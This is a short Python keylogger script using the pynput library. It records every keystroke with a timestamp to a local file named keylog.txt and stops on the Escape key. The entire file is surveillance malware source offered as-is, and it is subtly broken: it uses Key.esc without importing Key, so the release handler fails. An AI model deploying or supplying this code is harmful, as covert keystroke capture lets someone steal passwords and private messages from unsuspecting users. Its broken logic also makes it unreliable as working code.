from pynput.keyboard import Listener
from datetime import datetime


log_file = "keylog.txt"


def on_key_press(key):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Try to get the character of the key (like 'a', 'b', '1')
    try:
        key_character = key.char
    except AttributeError:
        # If it's a special key (like Enter or Esc), handle it here
        key_character = f"[{key}]"

 
    with open(log_file, "a") as file:
        file.write(f"{current_time} - {key_character}\n")


# Function to stop the keylogger when the Escape key is pressed
def on_key_release(key):
    if key == Key.esc:
        return False  # This stops the listener (and the program)


# Start listening to key presses and releases
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()  # Keep the program running
